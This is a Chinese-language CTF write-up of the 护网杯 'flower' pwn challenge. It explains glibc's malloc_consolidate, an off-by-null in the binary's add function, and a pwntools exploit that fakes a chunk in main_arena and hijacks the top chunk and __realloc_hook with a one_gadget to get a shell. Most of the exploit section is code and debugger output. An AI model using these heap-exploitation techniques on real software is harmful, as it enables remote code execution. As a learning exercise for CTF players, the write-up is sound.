---
layout: post
title: 护网杯flower writeup
categories: ctf
tags:  off-by-null pwn fastbin
author: jcxp
---
# 前言
这道题存在`off-by-null`漏洞,但是只能分配`fastbin`,可以通过触发`malloc_consolidate()`进行`overlapping`,然后通过劫持`topchunk`来`getshell`

## malloc_consolidate()函数分析
该函数主要有两个功能。  
1. 检查fastbin是否初始化，如果未初始化，则进行初始化。
2. 如果fastbin初始化，则按照一定的顺序合并fastbin中的chunk放入unsorted bin中。

```c
//libc-2.28

static void malloc_consolidate(mstate av)
{
  mfastbinptr*    fb;                 /* current fastbin being consolidated */
  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */
  mchunkptr       p;                  /* current chunk being consolidated */
  mchunkptr       nextp;              /* next chunk to consolidate */
  mchunkptr       unsorted_bin;       /* bin header */
  mchunkptr       first_unsorted;     /* chunk to link to */

  /* These have same use as in free() */
  mchunkptr       nextchunk;
  INTERNAL_SIZE_T size;
  INTERNAL_SIZE_T nextsize;
  INTERNAL_SIZE_T prevsize;
  int             nextinuse;
  mchunkptr       bck;
  mchunkptr       fwd;

  atomic_store_relaxed (&av->have_fastchunks, false);

  unsorted_bin = unsorted_chunks(av);

  /*
    Remove each chunk from fast bin and consolidate it, placing it
    then in unsorted bin. Among other reasons for doing this,
    placing in unsorted bin avoids needing to calculate actual bins
    until malloc is sure that chunks aren't immediately going to be
    reused anyway.
  */

  maxfb = &fastbin (av, NFASTBINS - 1);
  fb = &fastbin (av, 0);
  do {
    p = atomic_exchange_acq (fb, NULL);
    if (p != 0) {
      do {
    {
      unsigned int idx = fastbin_index (chunksize (p));
      if ((&fastbin (av, idx)) != fb)
        malloc_printerr ("malloc_consolidate(): invalid chunk size");
    }

    check_inuse_chunk(av, p);
    nextp = p->fd;  #按照fd的顺序遍历fastbin   

    /* Slightly streamlined version of consolidation code in free() */
    size = chunksize (p);
    nextchunk = chunk_at_offset(p, size);
    nextsize = chunksize(nextchunk);

    #pre_inuse为0,向前合并
    if (!prev_inuse(p)) {   
      prevsize = prev_size (p);
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }

    # 下面的chunk不是top_chunk
    if (nextchunk != av->top) { 
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);

      if (!nextinuse) {
        size += nextsize;
        unlink(av, nextchunk, bck, fwd);
      } else
        clear_inuse_bit_at_offset(nextchunk, 0);

      first_unsorted = unsorted_bin->fd;
      unsorted_bin->fd = p;
      first_unsorted->bk = p;

      if (!in_smallbin_range (size)) {
        p->fd_nextsize = NULL;
        p->bk_nextsize = NULL;
      }

      set_head(p, size | PREV_INUSE);
      p->bk = unsorted_bin;  #将此chunk放到unsoeted bin中
      p->fd = first_unsorted;
      set_foot(p, size);
    }

    else { #如果下面的chunk是top_chunk，那么久合并到top_chunk
      size += nextsize;
      set_head(p, size | PREV_INUSE);
      av->top = p;
    }

      } while ( (p = nextp) != 0);

    }
  } while (fb++ != maxfb);
}
```

这个函数的具体步骤如下:  
1. 判断`fastbin`是否初始化，如果未初始化，则进行初始化然后退出。
2. 按照`fastbin`由小到大的顺序（0x20 ,0x30 ,0x40这个顺序）合并`chunk`，每种相同大小的`fastbin`中`chunk`的处理顺序是从`fastbin->fd`开始取，下一个处理的是`p->fd`，依次类推。
3. 首先尝试合并`pre_chunk`。
4. 然后尝试合并`next_chunk`：如果n`ext_chunk`是`top_chunk`，则直接合并到`top_chunk`，然后进行第六步；如果n`ext_chunk`不是`top_chunk`，尝试合并。
5. 将处理完的`chunk`插入到`unsorted bin`头部。
6. 获取下一个空闲的`fastbin`，回到第二步，直到清空所有`fastbin`中的`chunk`，然后退出。








## 程序逻辑
在`add`函数中当chunk长度为`88`的时候,存在`off-by-null`

```c
_int64 add()
{
  __int64 result; // rax
  __int64 v1; // [rsp+0h] [rbp-10h]
  int v2; // [rsp+0h] [rbp-10h]
  int v3; // [rsp+4h] [rbp-Ch]
  void *v4; // [rsp+8h] [rbp-8h]

  LODWORD(v1) = 0;
  printf("Name of Size : ", v1);
  v3 = my_read();
  if ( v3 > 0 && v3 <= 88 )
  {
    printf("input index: ");
    v2 = my_read();
    if ( v2 >= 0 && v2 <= 5 )
    {
      v4 = malloc(v3);
      if ( !v4 )
      {
        puts("malloc error");
        exit(0);
      }
      dword_2020A8[4 * v2] = v3;
      *((_QWORD *)&unk_2020A0 + 2 * v2) = v4;
      puts("input flower name:");
      vul_func(*((_BYTE **)&unk_2020A0 + 2 * v2), v3);// off by null
      result = 0LL;
    }
    else
    {
      puts("error");
      result = 0LL;
    }
  }
  else
  {
    printf("error");
    result = 0LL;
  }
  return result;
}

//vul_func
__int64 __fastcall vul_func(_BYTE *a1, unsigned int a2)
{
  __int64 v3; // [rsp+18h] [rbp-8h]

  if ( !a2 )
    return 0LL;
  v3 = (signed int)read(0, a1, a2);
  if ( v3 == 88 )
    a1[88] = 0;
  return v3;
}
```

当只有`fastbin`时的`off-by-null`似乎不能利用

## tips
在输入选项时, 通过`scanf`输入,当输入非常长的字符串时,即使使用`setbuf()`关闭了输入缓冲区,依然会暂时申请一个`large chunk`存储输入的字符串.  



```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_E76();
  while ( 1 )
  {
    menu();
    __isoc99_scanf((__int64)"%d", (__int64)&v3);
    switch ( v3 )
    {
      case 1:
        add();
        break;
      case 2:
        remove();
        break;
      case 3:
        show();
        break;
    }
  }
}
```

在分配`large chunk`之前会调用`malloc_consolidate()`函数，使得`fastbin中的chunk`合并，通过这个小技巧我们可以获得`unsorted bin`.

## 利用流程
- 首先构造好相应的堆结构 ,这里申请的堆块`size`小于`0x58`  ,然后释放掉  

```python
add(87,0,'aaaa')
add(87,1,'bbbb')
add(87,2,'cccc')
add(87,3,'cccc')
add(87,4,'cccc')
add(0x20,5,'dddd')

for i in range(4):
	remove(i)
```
- 通过`scanf`触发`fastbin`合并   

```python
p.sendlineafter("oice >> \n",'1'*0x500)
```

此时的堆结构如下:  
```
0x555555757000:	0x0000000000000000	0x0000000000000181      //成功合并了这几个堆块儿
0x555555757010:	0x00007ffff7dd1ce8	0x00007ffff7dd1ce8
0x555555757020:	0x0000000000000000	0x0000000000000000
0x555555757030:	0x0000000000000000	0x0000000000000000
0x555555757040:	0x0000000000000000	0x0000000000000000
0x555555757050:	0x0000000000000000	0x0000000000000000
0x555555757060:	0x0000000000000000	0x0000000000000121
0x555555757070:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555757080:	0x0000000000000000	0x0000000000000000
0x555555757090:	0x0000000000000000	0x0000000000000000
0x5555557570a0:	0x0000000000000000	0x0000000000000000
0x5555557570b0:	0x0000000000000000	0x0000000000000000
0x5555557570c0:	0x0000000000000000	0x00000000000000c1
0x5555557570d0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x5555557570e0:	0x0000000000000000	0x0000000000000000
0x5555557570f0:	0x0000000000000000	0x0000000000000000
0x555555757100:	0x0000000000000000	0x0000000000000000
0x555555757110:	0x0000000000000000	0x0000000000000000
0x555555757120:	0x0000000000000000	0x0000000000000061
0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000000000
0x555555757160:	0x0000000000000000	0x0000000000000000
0x555555757170:	0x0000000000000000	0x0000000000000000
0x555555757180:	0x0000000000000180	0x0000000000000060     /prv_size=180
0x555555757190:	0x0000000a63636363	0x0000000000000000
0x5555557571a0:	0x0000000000000000	0x0000000000000000
0x5555557571b0:	0x0000000000000000	0x0000000000000000
0x5555557571c0:	0x0000000000000000	0x0000000000000000
0x5555557571d0:	0x0000000000000000	0x0000000000000000

```

- 通过`off-by-null`触发`chunk overlapping`,然后触发两次`malloc_consolidate`,进行堆块合并:  

```python
add(88,0,'e'*87)   //改写size
add(0x28,1,'B'*0x20 + '\x40')
add(0x30,2,'C'*0x30)
p.sendlineafter("oice >> \n",'1'*0x500)
add(88,0,'e'*87)
add(0x28,1,'B'*0x20 + '\x40')
add(0x30,2,'C'*0x30)

remove(1)
p.sendlineafter("oice >> \n",'1'*0x500)

remove(4)

p.sendlineafter("oice >> \n",'1'*0x500)
```
此时的内存布局如下:  

```
0x555555757060:	0x0a65656565656565	0x0000000000000181   
0x555555757070:	0x00007ffff7dd1ce8	0x00007ffff7dd1ce8
0x555555757080:	0x4242424242424242	0x4242424242424242
0x555555757090:	0x0000000000000030	0x0000000000000040
0x5555557570a0:	0x4343434343434343	0x4343434343434343
0x5555557570b0:	0x4343434343434343	0x4343434343434343
0x5555557570c0:	0x4343434343434343	0x4343434343434343
0x5555557570d0:	0x00007ffff7dd1b78	0x0000000000000091
0x5555557570e0:	0x00007ffff7dd1bf8	0x00007ffff7dd1bf8
0x5555557570f0:	0x0000000000000000	0x0000000000000000
0x555555757100:	0x0000000000000000	0x0000000000000000
0x555555757110:	0x0000000000000000	0x0000000000000000
0x555555757120:	0x0000000000000000	0x0000000000000061
0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000000000
0x555555757160:	0x0000000000000090	0x0000000000000000
0x555555757170:	0x0000000000000000	0x0000000000000000
0x555555757180:	0x0000000000000120	0x0000000000000060
0x555555757190:	0x0000000000000000	0x0000000000000000

```

- 然后进行几次内存分配重叠堆块,泄露`main_arena`的地址,


```python
add(0x30,3,'jcxp')
add(0x40,2,'jcxp')
add(0x20,0,'jcxp')
add(0x30,0,'jcxp')
add(0x30,0,'jcxp')

show(2)
p.recvuntil('flowers : ')

leak = u64(p.recv(6).ljust(8,'\x00'))
log.success(hex(leak))

libc_base = leak - libc.symbols['__malloc_hook'] - 0x10 - 0x58

log.success(hex(libc_base))
```
我这里使用的是通过覆盖`chunk2`的值为`main_arena+88`,此时的堆列表如下:

```
pwndbg> x /10gx 0x555555554000+0x2020a0
0x5555557560a0:	0x00005555557570e0	0x0000000000000030
0x5555557560b0:	0x0000000000000000	0x0000000000000000
0x5555557560c0:	0x0000555555757120	0x0000000000000040
0x5555557560d0:	0x00005555557570e0	0x0000000000000030
0x5555557560e0:	0x0000000000000000	0x0000000000000000
```
`chunk2`的内如如下

```
pwndbg> x /10gx 0x0000555555757120-0x10
0x555555757110:	0x0000000000000000	0x00000000000000d1
0x555555757120:	0x00007ffff7dd1b78	0x00007ffff7dd1b78  //fd为main_arena+88 
0x555555757130:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555757140:	0x0000000000000000	0x0000000000000000
0x555555757150:	0x0000000000000000	0x0000000000000000
```
- 在`main_arena`中布局一个`fake chunk`  
首先在`main_arena`中伪造一个size:  
```python
remove(0)
remove(1)
remove(3)
add(0x30,0,p64(0x51))
add(0x30,1,'jcxp')
add(0x30,3,'jcxp')
```
如下图所示
```shell
pwndbg> bins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x51
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x5555557571a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557571a0
smallbins
empty
largebins
empty
pwndbg> x /10gx 0x7ffff7dd1b78-88
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000051
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
```
然后在`main_arena`布局我们的`fake chunk`


```python 
add(0x40,1,'jcxp')
target = libc_base + libc.symbols['__malloc_hook'] + 0x10 + 0x10
remove(2)
remove(1)
remove(4)
add(0x40,4,p64(target))
add(0x40,1,'jcxp')
add(0x40,2,'jcxp')
add(0x40,0,p64(0)*5 + p64(0x51)+p64(0))
#---


target = target + 0x28+0x8
remove(2)
remove(1)
remove(4)


add(0x40,2,p64(target))

add(0x40,1,'jcxp')
add(0x40,4,'jcxp')

```
此时`main_arena`中的`fake chunk`如下

```
pwndbg> bins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x51
0x50: 0x7ffff7dd1b60 (main_arena+64) ◂— 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x40: 0x5555557571a0 —▸ 0x7ffff7dd1ba8 (main_arena+136) ◂— 0x5555557571a0
largebins
empty
pwndbg> x /10gx 0x7ffff7dd1b60
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000051
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x000055555575720a
0x7ffff7dd1b80 <main_arena+96>:	0x00005555557571a0	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
0x7ffff7dd1ba0 <main_arena+128>:	0x00007ffff7dd1b88	0x00007ffff7dd1b98
pwndbg> 
```

由于`main_arena+88`存放的使`topchunk`的值,我们可以通过`fake chunk`覆盖`topchunk`为`__malloc_hook-0x18`的地址.  
在测试时发现直接覆盖为`__malloc_hook-0x18`的地址 然后修改为`one_gadget`,并不能利用成功.  
这里修改`__realloc_hook`为`one_gadget`,此时`malloc_hook`为`realloc+0x14`地址处，通过`malloc`函数来触发`one_gadget`.代码如下:

```python 
add(0x40,1,p64(0)+p64(libc_base+libc.symbols['__realloc_hook']-0x18-0x8))
realloc = libc_base + libc.symbols['__libc_realloc']
one = 0xf02a4 + libc_base
add(0x40,0,p64(0)*2 + p64(one) + p64(realloc+0x14))
p.sendlineafter("oice >> \n",str(1))
p.sendlineafter('Size : ',str(10))
p.sendlineafter('index: ',str(0))
p.interactive()
```

- 成功`getshell`

```shell
[*] Switching to interactive mode
$ whoami
[DEBUG] Sent 0x7 bytes:
    'whoami\n'
[DEBUG] Received 0x5 bytes:
    'jcxp\n'
jcxp

```

